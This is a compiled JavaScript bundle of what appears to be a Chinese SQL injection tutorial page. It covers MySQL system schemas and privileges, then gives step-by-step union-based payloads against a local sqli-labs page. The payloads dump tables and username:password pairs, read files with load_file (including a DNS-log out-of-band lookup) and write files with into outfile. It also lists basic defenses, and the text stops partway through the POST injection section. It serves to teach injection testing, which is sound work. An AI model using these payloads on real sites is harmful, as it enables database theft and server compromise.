import{_ as l,W as d,X as t,Y as e,Z as a,a0 as n,a1 as i,C as r}from"./framework-b6a07282.js";const c="/assets/1-7921107b.jpg",u="/assets/2-7c161f49.jpg",m="/assets/3-f3589401.jpg",o="/assets/4-457f42fe.jpg",h={},p=i('<h2 id="sql注入" tabindex="-1"><a class="header-anchor" href="#sql注入" aria-hidden="true">#</a> SQL注入</h2><ul><li><p>SQL注入即是指<strong>web应用程序</strong>对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的<strong>SQL语句</strong>，在管理员不知情的情况下实现非法操作，以此来实现欺骗<strong>数据库服务器</strong>执行非授权的任意查询，从而进一步得到相应的数据信息.</p></li><li><p>web应用程序三层架构：表示层、业务逻辑层、数据访问层</p></li><li><p>SQL注入发生在业务逻辑层于数据访问层</p></li></ul>',2),v={href:"https://db-engines.com/en/ranking",target:"_blank",rel:"noopener noreferrer"},b=i('<h3 id="数据库" tabindex="-1"><a class="header-anchor" href="#数据库" aria-hidden="true">#</a> 数据库</h3><ul><li>数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。</li></ul><h4 id="关系型数据库" tabindex="-1"><a class="header-anchor" href="#关系型数据库" aria-hidden="true">#</a> 关系型数据库</h4><ul><li>关系型数据库是指采用关系模型来组织数据信息的数据库。</li><li>其实就是二维表，它是多个二维数组的集合，我们将数据存储在表格中，通过建立表格与表格之间的关系来维护数据间的关系。</li><li>优点： 1.容易理解：相对于其他模型（网状、层次）更容易理解，因为二维数组的逻辑更符合逻辑世界的概念。 2.使用方便：统一通过SQL语言，操作数据库方便。 3.易于维护：都是表结构，格式统一。</li><li>缺点： 1.为了维护一致性，读写性能差，主要体现在高并发和海量数据的读写。 2.扩展性差，表结构固定。</li><li>常见关系型数据库：Mysql、Oracle、PostgreSQL、SQL Server、Access、Sybase</li></ul><h4 id="非关系型数据库" tabindex="-1"><a class="header-anchor" href="#非关系型数据库" aria-hidden="true">#</a> 非关系型数据库</h4><ul><li>非关系型数据库是指采用键值对的模型来存储数据。</li><li>严格上来说，非关系型数据库不是一种数据库，它只完成数据的记录，不会记录数据与数据之间的关系。NoSQL(Not only SQL)数据库来指代非关系型数据库。</li><li>优点： 1.格式灵活：存储格式可以是key-value、文档等格式。 2.性能优越：非关系型数据库可以使用硬盘或者随机存储器作为载体，而关系型数据库只能使用硬盘。 3.成本低：基本都是开源，部署成本快。</li><li>缺点： 1.不支持sql，学习和运用成本较高。 2.无事务处理机制，无法回滚。 3.数据结构导致复杂查询不易实现。</li><li>常见非关系型数据库：Redis、MongoDB、BigTable、MemcacheDB等</li></ul><h5 id="区别" tabindex="-1"><a class="header-anchor" href="#区别" aria-hidden="true">#</a> 区别</h5><h6 id="存储方式" tabindex="-1"><a class="header-anchor" href="#存储方式" aria-hidden="true">#</a> <strong>存储方式</strong></h6><p>关系型数据库采用表的格式进行存储，数据以行和列的方式进行存储，读取和查询都十分方便。</p><p>非关系型数据库是以数据集的方式进行存储，即将大量数据都集中在一起存储，类似于键值对、图结构或者文档。</p><h6 id="存储结构" tabindex="-1"><a class="header-anchor" href="#存储结构" aria-hidden="true">#</a> <strong>存储结构</strong></h6><p>关系型数据库按照结构化的方法存储数据，在插入数据前需定义好存储数据的表结构，这使得整张数据表的可靠性和稳定性都比较高，但数据表存储数据后，若要修改数据表的结构就会十分困难。</p><p>非关系型数据库采用的是动态结构，如果面对大量非结构化数据的存储，它可以非常轻松的适应数据类型和结构的改变，也可以根据数据存储的需要灵活的改变数据库的结构。</p><h6 id="存储规范" tabindex="-1"><a class="header-anchor" href="#存储规范" aria-hidden="true">#</a> <strong>存储规范</strong></h6><p>关系型数据库为了规范化数据、避免重复数据以及充分利用存储空间将数据按照最小关系表的形式进行存储，这使得数据管理变得很清晰、一目了然。不过随着表数量的增加，表之间的关系会导致数据的管理变得越来越复杂。</p><p>非关系型数据库采用用平面数据集的方式集中存放数据，虽然会出现数据被重复存储造成浪费存储空间的情况。但是通常单个数据库都是采用单独存储的形式，很少采用分割存储的方式，因此数据往往被存储成一个整体对数据的读写提供了极大的方便。</p><h6 id="扩展方式" tabindex="-1"><a class="header-anchor" href="#扩展方式" aria-hidden="true">#</a> <strong>扩展方式</strong></h6><p>关系型数据库主要通过提高计算机自身性能缓解存储与读写压力，即所谓的纵向扩展。因为数据表之间存在着各种关系，所以采用横向扩展的方式会较为复杂，需要保证具有关联的数据表在同一服务器。</p><p>非关系型数据库采用数据集存储数据，这使得数据之间无关联性，可以分布式存储，因此可以采用横向扩展方式来扩展数据库，也就是说，可以添加更多数据库服务器到资源池来缓解存储与读取压力。</p><h6 id="查询方式" tabindex="-1"><a class="header-anchor" href="#查询方式" aria-hidden="true">#</a> <strong>查询方式</strong></h6><p>关系型数据库是采用结构化查询语言(即SQL)来对数据库进行查询，SQL支持数据库的CRUD操作，具有非常强大的功能。</p><p>非关系型数据库使用的是非结构化查询语言(UnQL)，UnQL以数据集(如文档)为单位来管理和操作数据，由于没有统一的标准，所以每个数据库厂商提供产品标准是不一样的。</p><h6 id="规范化" tabindex="-1"><a class="header-anchor" href="#规范化" aria-hidden="true">#</a> <strong>规范化</strong></h6><p>在关系型数据库中，一个数据实体需要分割成多个部分，然后再对分割的部分进行规范化，规范化后再分别存储到多张关系型数据表中，这是一个复杂的过程。</p><p>非关系型数据库不需要规范化数据，通常是在一个单独的存储单元中存储一个复杂的数据实体。</p><h6 id="授权方式" tabindex="-1"><a class="header-anchor" href="#授权方式" aria-hidden="true">#</a> <strong>授权方式</strong></h6><p>关系型数据库包括Oracle、SQLServer、DB2以及MySQL等，除了MySQL以外，大多数的关系型数据库都是非开源的，若要使用的话，则需要支付高昂的费用。</p><p>非关系型数据库包括Redis、HBase、 MongoDB、 Memcache等都是开源的，使用时不需要支付费用(企业版除外)。</p><h4 id="数据库服务器层级关系" tabindex="-1"><a class="header-anchor" href="#数据库服务器层级关系" aria-hidden="true">#</a> 数据库服务器层级关系</h4><img src="'+c+`"><p>服务器里面：</p><ul><li>多个数据库 <ul><li>多个数据表 <ul><li>多个行 列 字段 <ul><li>数据</li></ul></li></ul></li></ul></li></ul><h4 id="数据库的基本语法" tabindex="-1"><a class="header-anchor" href="#数据库的基本语法" aria-hidden="true">#</a> 数据库的基本语法</h4><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>查询当前数据库服务器所有的数据库	show databases;
选中某个数据库	use 数据库名字test 	use test
查询当前数据库所有的表				show tables；
查询t1表所有数据				select * from t1;
条件查询 id=2				select * from t1 where id=2；

查询id=2   pass =111
union 合并查询 
2个特性：
前面查询的语句 和 后面的查询语句 结果互不干扰！
前面的查询语句的字段数量 和 后面的查询语句字段数量  要一致
* == 3
select id from t1 where id=-1 union select * from t1 where pass =111;

order by 排序
order by 字段名字  id  也可以 跟上数字 1 2 3 4 .。。。。。
可猜解表的列数 知道表有几列  

创建表：create table t1(id int(5),name varchar(10),pass varchar(10));

插入数据：insert into t1(id,name,pass) values(1,&quot;小明&quot;,&quot;1234&quot;),(2,&quot;小红&quot;,&quot;4321&quot;),(3,&quot;小白&quot;,&quot;9876&quot;);

更新数据：update t1 set name=&#39;小绿&#39; where name=&#39;小红&#39;;

删除数据：delete from user where id=$id;

group_concat() 如果只能显示一行，可以将同一列的所有数据组合在一起，在同一行显示。

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="系统库" tabindex="-1"><a class="header-anchor" href="#系统库" aria-hidden="true">#</a> 系统库</h4><ul><li><p>提供了访问数据库元数据的方式</p></li><li><p>元数据是关于数据库的数据，如数据库名和表名，列的数据类型或访问权限。</p></li><li><p>mysql有4个系统库：information_schema、performance_schema、mysql、sys。</p></li></ul><ol><li><p><strong>information_schema 库</strong>：是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息；</p><p>例如数据库或表的名称，列的数据类型或访问权限。有时用于此信息的其他术语是数据字典和系统目录。web渗透过程中用途很大。</p><p><strong>SCHEMATA表</strong>：提供了当前MySQL实例中所有数据库信息， show databases结果取之此表。</p><p><strong>TABLES表</strong>：提供了关于数据中表的信息。<strong>table_name(具体表名)</strong>；<strong>table_schema(数据库的名称)</strong></p><p><strong>COLUMNS表</strong>：提供了表的列信息(每个列的字段名)，详细描述了某张表的所有列以及每个列的信息。<strong>column_name(每列里的所有字段)</strong></p></li><li><p><strong>performance_schema库</strong>具有87张表。 MySQL 5.5开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级。</p></li><li><p><strong>mysql库</strong>是核心数据库，类似于sql server中的master表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。 常用举例：在mysql.user表中修改root用户的密码</p></li><li><p><strong>sys库</strong>具有1个表，100个视图。 sys库是MySQL 5.7增加的系统数据库，这个库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。 可以查询谁使用了最多的资源，哪张表访问最多等。</p></li></ol><h4 id="sql注入中可利用的函数" tabindex="-1"><a class="header-anchor" href="#sql注入中可利用的函数" aria-hidden="true">#</a> SQL注入中可利用的函数</h4><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>database()</td><td>查看当前数据库</td></tr><tr><td>version()</td><td>查看数据库版本</td></tr><tr><td>user()</td><td>查看当前服务器中使用数据库的用户的名字和其对应的主机</td></tr><tr><td>@@basedir</td><td>查看该服务器的数据库安装路径</td></tr><tr><td>@@datadir</td><td>查看数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）</td></tr><tr><td>@@version_compile_os</td><td>查看该服务器的操作系统的版本号</td></tr><tr><td>@@character_set_database</td><td>显示字符集</td></tr></tbody></table><h4 id="手工注入" tabindex="-1"><a class="header-anchor" href="#手工注入" aria-hidden="true">#</a> 手工注入</h4>`,40),g=e("li",null,[e("p",null,"判断有无注入点"),e("p",null,"and 1 = 1 将这个参数带进去让服务器去执行，如果有注入点则不会报错。"),e("p",null,"and 1 = 2 将这个参数带进去让服务器去执行，如果有注入点则会报错。"),e("p",null,"也可以随便输入内容，如果有mysql的报错则有注入点，如果没有相关报错则无注入点")],-1),x=e("p",null,"如果有则去猜这张表有多少列",-1),_=e("p",null,[a("order by "),e("em",null,"1/2/3/4")],-1),f=e("p",null,"直到报错",-1),q={href:"http://localhost/Less-2/index.php?id=1",target:"_blank",rel:"noopener noreferrer"},y=e("em",null,"1",-1),L={href:"http://localhost/Less-2/index.php?id=-1",target:"_blank",rel:"noopener noreferrer"},S=e("strong",null,"因为onion前面的查询语句的字段数 和后面的查询语句字段数量要一致，order by猜出了3个，所以要1，2，3",-1),w={href:"http://localhost/Less-2/index.php?id=-1",target:"_blank",rel:"noopener noreferrer"},k={href:"http://localhost/Less-2/index.php?id=-1",target:"_blank",rel:"noopener noreferrer"},T=e("strong",null,"table_name",-1),Q=e("strong",null,"information_schema.tables",-1),A=e("strong",null,"table_schema",-1),E=e("strong",null,"database()",-1),M={href:"http://localhost/Less-2/index.php?id=-1",target:"_blank",rel:"noopener noreferrer"},C=e("strong",null,"column_name",-1),O=e("strong",null,"information_schema.columns",-1),I=e("strong",null,"0x7573657273",-1),P=e("p",null,"注意：users字符的16进制为0x7573657273",-1),G={href:"http://localhost/Less-2/index.php?id=-1",target:"_blank",rel:"noopener noreferrer"},X={href:"http://localhost/Less-2/index.php?id=-1",target:"_blank",rel:"noopener noreferrer"},B=e("strong",null,"users",-1),N=i('<p>​ 0x3a为 :</p><h4 id="高权限注入" tabindex="-1"><a class="header-anchor" href="#高权限注入" aria-hidden="true">#</a> 高权限注入</h4><ul><li><p>在数据库中区分有数据库系统用户与数据库普通用户,二者的划分主要体现在对一些高级函数与资源表的访问权限上。直白一些就是高权限系统用户拥有整个数据库的操作权限,而普通用户只拥有部分已配置的权限。</p></li><li><p>网站在创建的时候会调用数据库链接,会区分系统用户链接与普通用户链接;当多个网站存在一个数据库的时候,root就拥有最高权限可以对多个网站进行管辖,普通用户仅拥有当前网站和配置的部分权限。所以当我们获取到普通用户权限时,我们只拥有单个数据库权限,甚至文件读写失败;取得高权限用户权限，不仅可以查看所有数据库,还可以对服务器文件进行读写操作。</p></li><li><p>进行高权限注入的前提：1.是root用户，2.是5.0版本以上的mysql服务器（有系统库）</p></li></ul><p>假设有A网站和B网站，它们的数据库都运行在同一台mysql服务器上。A网站运行的数据库用户是root，而B网站运行的数据库用户是一个普通用户。我们可以通过对A网站进行SQL注入，不仅可以查看修改A网站的数据库，还可以查看或修改B网站的数据库。而在B网站进行SQL注入则不也能对A网站的数据库进行任何操作，因为B网站运行数据库的用户权限低。</p><img src="'+u+`"><h5 id="mysql权限介绍" tabindex="-1"><a class="header-anchor" href="#mysql权限介绍" aria-hidden="true">#</a> Mysql权限介绍</h5><ul><li>mysql中存在4个控制权限的表，分别为user表，db表，tables_priv表，columns_priv表。</li></ul><ol><li><p>mysql权限表的验证过程为：先从user表中的Host,User,Password这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。</p></li><li><p>通过身份认证后，进行权限分配， 按照user，db，tables_priv，columns_priv的顺序进行验证。 即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y， 将不再检查db, tables_priv,columns_priv；如果为N，则到db表中检查此用户对应的具体数据库， 并得到db中为Y的权限；如果db中为N，则检查tables_priv中此数据库对应的具体表，取得表中的权限Y，以此类推。</p></li></ol><h6 id="系统权限表" tabindex="-1"><a class="header-anchor" href="#系统权限表" aria-hidden="true">#</a> 系统权限表</h6><ul><li>User表：存放用户账户信息以及全局级别（所有数据库）权限，决定了来自哪些主机的哪些用户可以访问数据库实例，如果有全局权限则意味着对所有数据库都有此权限</li><li>Db表：存放数据库级别的权限，决定了来自哪些主机的哪些用户可以访问此数据库</li><li>Tables_priv表：存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的这个表</li><li>Columns_priv表：存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的这个字段</li><li>Procs_priv表：存放存储过程和函数级别的权限</li></ul><h6 id="mysql-权限级别分为" tabindex="-1"><a class="header-anchor" href="#mysql-权限级别分为" aria-hidden="true">#</a> MySQL 权限级别分为：</h6><ul><li>全局性的管理权限： 作用于整个MySQL实例级别</li><li>数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上</li><li>数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象</li></ul><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>## use mysql;

1.查看mysql 有哪些用户：
select user,host from mysql.user;
 
2.查看用户对应权限
select * from user where user=&#39;root&#39; and host=&#39;localhost&#39;\\G;  #所有权限都是Y ，就是什么权限都有
 
3.创建 mysql 用户
有两种方式创建MySQL授权用户

执行create user/grant命令（推荐方式）
CREATE USER &#39;finley&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;some_pass&#39;;
通过insert语句直接操作MySQL系统权限表
 
4.只提供id查询权限
grant select(id) on test.temp to test1@&#39;localhost&#39; identified by &#39;123456&#39;;
 
5.把普通用户变成管理员
GRANT ALL PRIVILEGES ON *.* TO &#39;test1&#39;@&#39;localhost&#39; WITH GRANT OPTION;

6.删除用户
drop user finley@&#39;localhost&#39;;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="高权限注入实战" tabindex="-1"><a class="header-anchor" href="#高权限注入实战" aria-hidden="true">#</a> 高权限注入实战</h6><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>1.查询所有数据库名称
http://localhost/Less-2/?id=-1
union select 1,group_concat(schema_name),3 from information_schema.schemata

2.查询数据库所有的表名
http://localhost/Less-2/?id=-1
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x74657374

3.查询该表里的所有字段名
http://localhost/Less-2/?id=-1
union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7431

4.查询数据
http://localhost/Less-2/?id=-1
union select 1,name,pass from test.t1

http://localhost/Less-2/?id=-1
union select 1,2,group_concat(name,0x3a,pass)from test.t1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="sql注入之文件读写" tabindex="-1"><a class="header-anchor" href="#sql注入之文件读写" aria-hidden="true">#</a> SQL注入之文件读写</h4><ul><li>利用文件的读写权限，可以读取系统的文件信息以及写入一句话木马。</li></ul><h5 id="文件读写注入的条件" tabindex="-1"><a class="header-anchor" href="#文件读写注入的条件" aria-hidden="true">#</a> 文件读写注入的条件</h5><ul><li>高版本的MYSQL添加了一个新的特性secure_file_priv,该选项限制了mysql导出文件的权限，默认为NULL且要自己添加secure_file_priv。</li></ul><p>linux系统：cat etc/my.conf [mysqld] secure_file_priv=</p><p>win系统：www/mysql/my.ini [mysqld] secure_file_priv=</p><p>show global variables like &#39;%secure%&#39; 查看mysql全局变量的配置</p><ol><li>secure_file_priv=&#39;&#39; 代表对文件读写没有限制</li><li>secure_file_priv=NULL 代表不能进行文件读写</li><li>secure_file_priv=d:/phpstudy/mysql/data 代表只能对该路径下文件进行读写</li></ol><h5 id="常见网站的绝对路径" tabindex="-1"><a class="header-anchor" href="#常见网站的绝对路径" aria-hidden="true">#</a> 常见网站的绝对路径</h5><p>windows:</p><p>PHPstudy: phpstudy/www phpstudy/PHPTutorial/www</p><p>Xampp xampp/htdocs</p><p>Wamp wamp/www</p><p>Appser appser/www</p><p>Linux:</p><p>/var/mysql/data</p><p>/var/www/html</p><p>路径获取常见方式：报错显示，遗留文件（如phpinfo.php），漏洞报错，平台配置文件等。</p><h5 id="读取文件" tabindex="-1"><a class="header-anchor" href="#读取文件" aria-hidden="true">#</a> 读取文件</h5><p>使用函数：load_file()</p><p>后面的路径可以是单引号，0x，char转换的字符。</p><p>注意：路径中斜杆是/不是\\，如果要用\\要写\\\\</p><p>一般可以与union中做为一个字段使用，查看config.php(即mysql的密码)，apache配置...</p><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>http://localhost/Less-2/index.php?id=-1
union select 1,load_file(&#39;F:/1.txt&#39;),3
或
http://localhost/Less-2/index.php?id=-1
union select 1,load_file(0x463a2f312e747874),3

select load_file(&quot;\\\\\\\\dkjdks.dnslog.cn\\\\a.txt&quot;); 访问dns
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="写入文件" tabindex="-1"><a class="header-anchor" href="#写入文件" aria-hidden="true">#</a> 写入文件</h5><ul><li>--+ 注释掉后面的SQL语句</li></ul><p>使用函数：Into Outfile（用的比较多，能写入多行，按格式输出）和 into Dumpfile（只能写入一行且没有输出格式）</p><p>outfile 后面不能接0x开头或者char转换以后的路径，只能是单引号路径</p><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>http://localhost/Less-2/index.php?id=-1
union select 1,&#39;HELLO&#39;,3 into outfile &#39;F:/1.txt&#39; --+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="sql注入基础防御" tabindex="-1"><a class="header-anchor" href="#sql注入基础防御" aria-hidden="true">#</a> SQL注入基础防御</h4><h5 id="魔术引号" tabindex="-1"><a class="header-anchor" href="#魔术引号" aria-hidden="true">#</a> 魔术引号</h5><ul><li>magic_quotes_gpc</li><li>所有的 单引号（’）、双引号（”）、反斜线（\\）和 空字符会自动转为含有反斜线的溢出字符 如：\\&#39;、\\&quot;\\&quot;</li></ul><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>php<span class="token operator">.</span>ini
magic_quotes_gpc <span class="token operator">=</span> On	开启
magic_quotes_gpc <span class="token operator">=</span> Off	关闭
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="内置函数" tabindex="-1"><a class="header-anchor" href="#内置函数" aria-hidden="true">#</a> 内置函数</h5><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token function">is_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 判断是否为整型
<span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 给数据库查询语句等，在单引号（’）、双引号（”）、反斜线（\\）与 <span class="token constant">NUL</span>（<span class="token constant">NULL</span> 字符）字符前加上了反斜线。

<span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment">//弃用了</span>
<span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment">//弃用了</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="自定义关键字" tabindex="-1"><a class="header-anchor" href="#自定义关键字" aria-hidden="true">#</a> 自定义关键字</h5><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;select&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;GGGGG&#39;</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将select转换为GGGGG</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="杜绝sql语句的拼接" tabindex="-1"><a class="header-anchor" href="#杜绝sql语句的拼接" aria-hidden="true">#</a> 杜绝sql语句的拼接</h5><p>预编译prepare statement</p><h5 id="控制错误信息" tabindex="-1"><a class="header-anchor" href="#控制错误信息" aria-hidden="true">#</a> 控制错误信息</h5><p>将报错信息改为：系统发生错误，请联系管理员</p><h5 id="数据库权限控制" tabindex="-1"><a class="header-anchor" href="#数据库权限控制" aria-hidden="true">#</a> 数据库权限控制</h5><h5 id="数据加密" tabindex="-1"><a class="header-anchor" href="#数据加密" aria-hidden="true">#</a> 数据加密</h5><p>将数据库的密码之类的数据加密再存储</p><h5 id="部署安全防护软件-waf等。" tabindex="-1"><a class="header-anchor" href="#部署安全防护软件-waf等。" aria-hidden="true">#</a> 部署安全防护软件，WAF等。</h5><h4 id="sql注入之数据类型" tabindex="-1"><a class="header-anchor" href="#sql注入之数据类型" aria-hidden="true">#</a> SQL注入之数据类型</h4><h5 id="数字型注入" tabindex="-1"><a class="header-anchor" href="#数字型注入" aria-hidden="true">#</a> 数字型注入</h5>`,62),D={href:"http://xxx.com/users.php?id=1",target:"_blank",rel:"noopener noreferrer"},z=i(`<p>​ 这一类的 SQL 语句原型大概为</p><p><code>select * from 表名 where id=1</code></p><p>​ 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：</p><p><code>select * from 表名 where id=1 and 1=1</code> //这里的语句作用是用来判定是否存在数字型注入，如有注入点不会报错。</p><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>#数字型注入流程

?id=1 and 1=1/1=2 判断是否存在注入

?id=1 order by 1/2/3  猜字段，如有报错字段数则是上一位所输入的数字

?id=-1 union select 1,2  看回显点

?id=-1 union select 1,database()  查看当前数据库名

?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39;  查当前数据库的所有表名

?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;  查看flag表里的列名

?id=-1 union select 1,group_concat(flag) from flag  查看段内容

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="字符型注入" tabindex="-1"><a class="header-anchor" href="#字符型注入" aria-hidden="true">#</a> 字符型注入</h5><ul><li>最重要的是要闭合，闭合，闭合</li></ul>`,7),F={href:"http://xxx.com/users.php?name=admin",target:"_blank",rel:"noopener noreferrer"},U=i(`<p>​ 这一类的 SQL 语句原型大概为 <code>select * from 表名 where name=&#39;admin&#39;</code> 值得注意的是这里比于数字型注入类型的sql语句原型多了引号，可以是<strong>单引号</strong>或者是<strong>双引号</strong>。</p><p>​ 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：</p><p><code>select * from 表名 where name=&#39;admin&#39; and 1=1 &#39;</code> //这里的语句作用是用来判定是否存在字符型注入，如有注入点则会报错。</p><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>#字符型注入流程

?id=1&#39; 判断是否存在注入，如果报错则存在注入点

?id=1&#39; order by 1/2/3 --+ 猜字段，如有报错字段数则是上一位所输入的数字

?id=-1&#39; union select 1,2 --+ 看回显点

?id=-1&#39; union select 1,database() --+ 查看当前数据库名

?id=-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 查当前数据库的所有表名

?id=-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 --+ 查看flag表里的列名

?id=-1&#39; union select 1,group_concat(flag) from flag --+ 查看段内容
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="搜索型注入" tabindex="-1"><a class="header-anchor" href="#搜索型注入" aria-hidden="true">#</a> 搜索型注入</h5><ul><li>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>&quot;keyword=关键字&quot;</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</li></ul><p>此类注入点提交的 SQL 语句，其原形大致为：</p><p><code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code></p><p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：</p><p><code>select * from 表名 where 字段 like &#39;%测试%&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p><p><code>select * from user where like &#39;%y%&#39; or 1=1#%&#39;</code> #后面为注释掉预先为你设置的%&#39;</p><p>y%&#39; or 1=1#</p><p>like 模糊查询</p><p>%% 通配符</p><h5 id="xx型注入点" tabindex="-1"><a class="header-anchor" href="#xx型注入点" aria-hidden="true">#</a> xx型注入点</h5><p>其他型：也就是由于SQL语句拼接方式不同，在SQL中的实际语句为：，其本质为（xx&#39;) or 1=1 # ）</p><p>常见的闭合符号：&#39; &#39;&#39; % ( {</p><h4 id="sql注入之数据提交方式" tabindex="-1"><a class="header-anchor" href="#sql注入之数据提交方式" aria-hidden="true">#</a> SQL注入之数据提交方式</h4><h5 id="get方式注入" tabindex="-1"><a class="header-anchor" href="#get方式注入" aria-hidden="true">#</a> GET方式注入</h5><p>get注入方式比较常见，主要是通过url中传输数据到后台，带入到数据库中去执行，可利用联合注入方式直接注入</p><h5 id="post方式注入" tabindex="-1"><a class="header-anchor" href="#post方式注入" aria-hidden="true">#</a> POST方式注入</h5><p>post提交方式主要适用于表单的提交，用于登录框的注入</p><p>方法：利用BurpSuite抓包进行重放修改内容进行，和get差别是需要借助抓包工具进行测试，返回结果主要为代码，也可转化为网页显示</p><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>uname=hzy&amp;passwd=123456&amp;submit=Submit
#POST字符串注入流程

uname=hzy&#39;&amp;passwd=123456&amp;submit=Submit 判断是否存在注入，如果报错则存在注入点

uname=hzy&#39; order by 1/2/3 --+&amp;passwd=123456&amp;submit=Submit 猜字段，如有报错字段数则是上一位所输入的数字

uname=hzy&#39; union select 1,2 --+&amp;passwd=123456&amp;submit=Submit 看回显点

